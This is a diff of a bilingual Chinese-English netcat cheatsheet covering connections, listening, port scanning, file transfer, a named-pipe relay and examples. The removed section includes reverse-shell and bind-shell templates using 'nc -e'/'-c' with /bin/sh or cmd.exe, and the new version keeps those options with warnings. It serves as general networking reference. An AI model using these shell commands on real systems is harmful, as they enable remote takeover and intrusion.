@@ -1,132 +1,167 @@
 ##############################################################################
-# NC 命令速查表 (Netcat Cheatsheet)
-# 瑞士军刀 - 网络工具 (Swiss Army Knife for Networking)
+# nc / netcat 速查表 (nc / netcat Cheatsheet)
+# 一款用于读/写网络连接的多功能网络工具。
 # https://github.com/funnyzak/cli-cheatsheets
 ##############################################################################
 
 # 图例 (Legend):
-#   - HOST:      主机名或 IP 地址 (Hostname or IP Address, 例如: google.com, 192.168.1.1)
-#   - PORT:      端口号 (Port Number, 例如: 80, 22, 443)
-#   - FILE:      本地文件路径 (Local File Path, 例如: /path/to/file.txt)
-#   - COMMAND:   要执行的命令 (Command to execute, 例如: /bin/bash)
-#   - INTERVAL:  时间间隔 (Time interval, 例如: 1s, 1m, 1h)
+#   - HOST:       目标主机名或 IP 地址 (Target hostname or IP address)
+#   - PORT:       目标或本地端口号 (Target or local port number)
+#   - LOCAL_PORT: 本地源端口号 (Local source port number)
+#   - FILE:       文件名 (Filename)
+#   - TIMEOUT:    超时秒数 (Timeout in seconds)
+#   - COMMAND:    要执行的命令 (Command to execute - Use with extreme caution!)
+
+# 注意 (Note):
+#   - Netcat 有多个版本 (BSD, GNU/OpenBSD), 选项可能略有不同。
+#   - The options might differ slightly between netcat versions (BSD, GNU/OpenBSD).
+#   - `-p PORT` 在客户端模式下指定源端口，在旧版或某些服务器模式下指定监听端口。
+#   - `-p PORT` specifies the source port in client mode, and the listen port in older/some server modes.
+#   - `-l` 通常表示监听模式。一些版本需要 `nc -l -p PORT`, 另一些是 `nc -l PORT`.
+#   - `-l` usually signifies listen mode. Some versions need `nc -l -p PORT`, others `nc -l PORT`.
 
 ##############################################################################
-# 基本用法 (Basic Usage)
+# 核心模式 (Core Modes)
 ##############################################################################
 
-nc -v HOST PORT                             # 连接到指定主机和端口 (TCP, verbose)
-nc -u -v HOST PORT                          # 连接到指定主机和端口 (UDP, verbose)
-nc -l -p PORT                               # 监听指定端口 (TCP, listen mode)
-nc -l -u -p PORT                            # 监听指定端口 (UDP, listen mode)
+# 客户端模式 (Client Mode - Connecting to a server)
+nc HOST PORT                           # 连接到 TCP 端口 (Connect to TCP port)
+nc -u HOST PORT                        # 连接到 UDP 端口 (Connect to UDP port)
+echo "REQUEST" | nc HOST PORT          # 发送数据到端口 (Send data to port)
+nc HOST PORT > FILE                    # 接收数据并存到文件 (Receive data into file)
+nc HOST PORT < FILE                    # 从文件发送数据 (Send data from file)
 
-# 提示:
-#   - `-v` (verbose):  显示详细输出
-#   - `-u` (UDP):      使用 UDP 协议 (默认 TCP)
-#   - `-l` (listen):   监听模式 (作为服务器)
-#   - `-p PORT`:     指定监听端口 (listen port)
+# 服务器模式 (Server Mode - Listening for connections)
+nc -l PORT                             # 监听 TCP 端口 (Listen on TCP port - common syntax)
+nc -l -p PORT                          # 监听 TCP 端口 (Listen on TCP port - alternative/older syntax)
+nc -l -u PORT                          # 监听 UDP 端口 (Listen on UDP port - common syntax)
+nc -l -u -p PORT                       # 监听 UDP 端口 (Listen on UDP port - alternative/older syntax)
+nc -k -l PORT                          # 持续监听 TCP 端口 (BSD nc) (Keep listening after client disconnects - BSD nc)
+while true; do nc -l PORT; done        # 持续监听 (通用方法) (Keep listening - general method)
+
+##############################################################################
+# 常用选项 (Common Options)
+##############################################################################
+
+# 通用 (General)
+-v                                     # 详细输出 (Verbose output)
+-vv                                    # 更详细输出 (More verbose output)
+-n                                     # 仅使用 IP 地址，不解析域名 (Numeric only - no DNS lookup)
+-u                                     # 使用 UDP 协议 (Use UDP instead of TCP)
+-w TIMEOUT                             # 设置连接或数据传输超时 (Set connection/transfer timeout)
+-4                                     # 仅使用 IPv4 (Use IPv4 only)
+-6                                     # 仅使用 IPv6 (Use IPv6 only)
+
+# 客户端特定 (Client Specific)
+-p LOCAL_PORT                          # 指定本地源端口 (Specify local source port)
+-s SOURCE_IP                           # 指定本地源 IP 地址 (Specify local source IP address)
+-z                                     # Zero-I/O 模式 (用于端口扫描) (Zero-I/O mode - for port scanning)
+
+# 服务器特定 (Server Specific)
+-l                                     # 监听模式 (Listen mode)
+-k                                     # (BSD nc) 接受多个连接 (Keep listening for multiple connections - BSD nc)
+-e COMMAND                             # (危险!) 连接后执行命令 (Execute command after connection - DANGEROUS!)
+-c COMMAND                             # (危险!) 连接后执行 shell 命令 (Execute shell command after connection - DANGEROUS!)
 
 ##############################################################################
 # 端口扫描 (Port Scanning)
 ##############################################################################
 
-nc -v -z HOST -n PORT-PORT                  # 扫描指定范围端口 (TCP, zero-I/O, numeric IP)
-nc -v -zu HOST -n PORT-PORT                 # 扫描指定范围端口 (UDP, zero-I/O, numeric IP)
-nc -v -w SEC -z HOST PORT                    # 设置超时时间扫描端口 (TCP, timeout)
+nc -vz HOST PORT                       # 扫描单个 TCP 端口 (Scan a single TCP port)
+nc -vzu HOST PORT                      # 扫描单个 UDP 端口 (Scan a single UDP port)
+nc -vz HOST START_PORT-END_PORT        # 扫描 TCP 端口范围 (Scan a range of TCP ports)
+nc -vzu HOST START_PORT-END_PORT       # 扫描 UDP 端口范围 (Scan a range of UDP ports)
 
-# 提示:
-#   - `-z` (zero-I/O): 仅扫描端口，不发送数据
-#   - `-n` (numeric-IP):  不进行 DNS 解析，加速扫描
-#   - `-w SEC` (timeout): 设置超时秒数 (seconds)
+# 提示 (Tips):
+#   - `-z` 选项表示不发送任何数据，仅探测端口是否打开。
+#   - The `-z` option means no data is sent, just checking if the port is open.
+#   - UDP 扫描可能不可靠，因为 UDP 是无连接的。
+#   - UDP scanning can be unreliable due to the connectionless nature of UDP.
 
 ##############################################################################
 # 文件传输 (File Transfer)
 ##############################################################################
 
-# 发送文件 (Sender)
-nc -l -p PORT > received_file               # 监听端口接收文件并保存 (服务器端)
-nc HOST PORT < FILE                         # 连接到服务器并发送文件 (客户端)
+# 方法 1: 服务器发送, 客户端接收 (Method 1: Server sends, Client receives)
+# Server:
+nc -l PORT < FILE_TO_SEND              # 服务器监听并发送文件内容
+# Client:
+nc HOST PORT > RECEIVED_FILE           # 客户端连接并接收文件内容
 
-# 接收文件 (Receiver)
-nc -l -p PORT > FILE                       # 监听端口接收文件并保存 (接收端)
-nc HOST PORT < send_file                    # 连接到服务器并发送文件 (发送端)
+# 方法 2: 客户端发送, 服务器接收 (Method 2: Client sends, Server receives)
+# Server:
+nc -l PORT > RECEIVED_FILE             # 服务器监听并将接收内容存入文件
+# Client:
+nc HOST PORT < FILE_TO_SEND            # 客户端连接并发送文件内容
 
-# 提示:
-#   - 可以使用 `gzip` 或 `tar` 压缩文件后再传输，提高效率
-#   - 例如: `tar cz FILE.tar.gz FILE | nc HOST PORT`
-
-##############################################################################
-# 命令行 Shell (Command Shell)
-##############################################################################
-
-# 反向 Shell (Reverse Shell - 受害者机器执行)
-nc -e COMMAND HOST PORT                     # 连接到监听器并执行命令 (不安全，谨慎使用!)
-nc -c COMMAND HOST PORT                     # 同上，某些 nc 版本使用 -c
-
-# 绑定 Shell (Bind Shell - 监听机器执行)
-nc -l -p PORT -e COMMAND                   # 监听端口，连接后提供 Shell (不安全，谨慎使用!)
-nc -l -p PORT -c COMMAND                   # 同上，某些 nc 版本使用 -c
-
-# 提示:
-#   - `-e COMMAND` 或 `-c COMMAND`: 执行指定命令 (exec command)
-#   - 强烈不建议在生产环境或不信任的网络中使用 Shell 功能，存在安全风险!
-#   - 常用命令: `/bin/sh`, `/bin/bash`, `/bin/zsh`, `cmd.exe` (Windows)
-
-##############################################################################
-# 高级选项 (Advanced Options)
-##############################################################################
-
-nc -k -l -p PORT                           # 长连接监听，连接断开后继续监听 (keep-alive)
-nc -t HOST PORT                             # 使用 TCP keep-alive 探测连接
-nc -i INTERVAL HOST PORT                     # 设置发送/接收数据间隔时间 (interval)
-nc -w SEC HOST PORT                         # 设置连接超时时间 (timeout)
-nc -s SRC_ADDR HOST PORT                    # 指定源 IP 地址 (source address)
-nc -o FILE -z HOST PORT                     # 将扫描结果输出到文件 (output file)
-nc -x PROXY_ADDR:PORT HOST PORT              # 使用 HTTP 或 SOCKS 代理 (proxy)
-
-# 提示:
-#   - `-k` (keep-alive):  保持监听状态，即使连接断开
-#   - `-t` (tcp-keepalive): 启用 TCP keep-alive 探测
-#   - `-i INTERVAL` (interval): 设置发送/接收间隔 (seconds/minutes/hours)
-#   - `-s SRC_ADDR` (source):  指定源 IP 地址
-#   - `-o FILE` (output):     将输出保存到文件
-#   - `-x PROXY` (proxy):      使用代理服务器
+# 提示 (Tips):
+#   - 这种传输不加密，不适合敏感数据。考虑使用 scp, rsync, sftp 等。
+#   - This transfer is unencrypted. Use scp, rsync, sftp for sensitive data.
+#   - 使用 `-N` (某些版本) 可以在 EOF 后关闭连接，确保传输完整。
+#   - Use `-N` (on some versions) to shutdown the network socket after EOF on input.
+#   - 可以结合 `tar` 或 `gzip` 传输目录或压缩文件:
+#     - Sender: `tar czf - /path/to/dir | nc -l PORT`
+#     - Receiver: `nc HOST PORT | tar xzf -`
 
 ##############################################################################
 # 实用技巧 (Tips and Tricks)
 ##############################################################################
 
-# 测试端口是否开放:
-#   nc -z -v HOST PORT
+# 简单 HTTP 请求 (Simple HTTP Request)
+printf "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" | nc example.com 80
 
-# 快速 HTTP 请求:
-#   echo -e "GET / HTTP/1.0\nHost: HOST\n\n" | nc HOST 80
+# 检查远程服务 Banner (Check remote service banner)
+echo "QUIT" | nc -v -w 2 mail.server.com 25
 
-# 作为简单的 TCP/UDP 服务器/客户端
-#   用于调试网络程序或脚本
+# 简单 TCP 代理/中继 (Simple TCP Proxy/Relay)
+# 需要命名管道 (Requires a named pipe)
+mkfifo /tmp/backpipe
+nc -l LISTEN_PORT 0</tmp/backpipe | nc TARGET_HOST TARGET_PORT 1>/tmp/backpipe
+# 清理 (Cleanup): rm /tmp/backpipe
 
-# 使用管道组合其他命令
-#   例如: `command | nc HOST PORT` 或 `nc -l -p PORT | command`
+# 创建一个简单的“聊天”服务器 (Create a simple "chat" server)
+# Server:
+nc -l 1234
+# Client 1:
+nc server_ip 1234
+# Client 2:
+nc server_ip 1234
+# (注意: 这是一个非常基础的回显服务器，不是真正的聊天室)
+# (Note: This is a very basic echo server, not a real chat room)
+
+# !!! 安全警告 (Security Warning) !!!
+#   - 使用 `-e` 或 `-c` 选项极其危险，它允许远程执行命令，可能导致系统被完全控制。
+#   - Using the `-e` or `-c` options is extremely dangerous as it allows remote command execution and can lead to system compromise.
+#   - 仅在完全信任的网络和场景下使用，并了解其风险。
+#   - Only use it in fully trusted networks and scenarios, understanding the risks involved.
 
 ##############################################################################
 # 示例 (Examples)
 ##############################################################################
 
-# 示例 1:  监听 12345 端口 (TCP), 并将接收到的数据保存到 received.txt
-#   nc -l -p 12345 > received.txt
+# 示例 1: 测试本地 Web 服务器是否在 8080 端口运行
+# Example 1: Test if a local web server is running on port 8080
+nc -vz localhost 8080
+# Output: Connection to localhost 8080 port [tcp/http-alt] succeeded! (or similar)
 
-# 示例 2:  连接到 google.com 的 80 端口 (TCP), 发送 HTTP GET 请求
-#   echo -e "GET / HTTP/1.0\nHost: google.com\n\n" | nc google.com 80
+# 示例 2: 从服务器 192.168.1.100 的 5000 端口接收 backup.tar.gz
+# Example 2: Receive backup.tar.gz from server 192.168.1.100 on port 5000
+# On Server (192.168.1.100):
+#   nc -l 5000 < backup.tar.gz
+# On Client (Your machine):
+#   nc 192.168.1.100 5000 > backup.tar.gz
 
-# 示例 3:  扫描 192.168.1.100 的 1-100 端口 (TCP)
-#   nc -v -z 192.168.1.100 -n 1-100
+# 示例 3: 扫描主机 10.0.0.5 的 20 到 30 TCP 端口
+# Example 3: Scan TCP ports 20 through 30 on host 10.0.0.5
+nc -vz 10.0.0.5 20-30
 
 ##############################################################################
-# 鸣谢 & 更多资源 (Credit & Further Resources)
+# 更多资源 (Further Resources)
 ##############################################################################
 
-# https://linux.die.net/man/1/nc
-# https://www.sans.org/security-resources/tcpip/netcat-part-1
-# https://null-byte.wonderhowto.com/inspiration/netcat-tutorial-hacker-swiss-army-knife-0132984/
+# man nc
+# https://nmap.org/ncat/ (Ncat - Nmap's modern netcat replacement)
+# https://linux.die.net/man/1/nc (GNU Netcat)
+# https://man.openbsd.org/nc.1 (OpenBSD Netcat)
 
-# vim: set ts=4 sw=4 tw=0 et ft=text :
+# vim: set ts=4 sw=4 tw=0 et ft=bash :
